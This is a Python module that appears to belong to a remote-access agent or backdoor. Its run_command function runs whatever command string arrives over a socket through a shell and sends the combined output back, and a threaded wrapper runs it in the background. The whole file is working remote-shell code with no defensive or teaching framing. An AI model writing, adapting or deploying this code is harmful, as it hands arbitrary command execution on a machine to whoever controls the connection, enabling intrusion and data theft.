import subprocess
import threading

from agent.core.protocol import reliable_send


def run_command(sock, command):
    try:
        proc = subprocess.Popen(
            command, shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )
        stdout_value, stderr_value = proc.communicate()
        result = stdout_value + stderr_value
        try:
            result = result.decode('utf-8', errors='replace')
        except Exception:
            result = result.decode('latin-1', errors='replace')
        reliable_send(sock, result)
    except Exception as e:
        reliable_send(sock, f'[-] Error executing command: {str(e)}')


def run_command_async(sock, command):
    t = threading.Thread(target=run_command, args=(sock, command))
    t.daemon = True
    t.start()
    return t
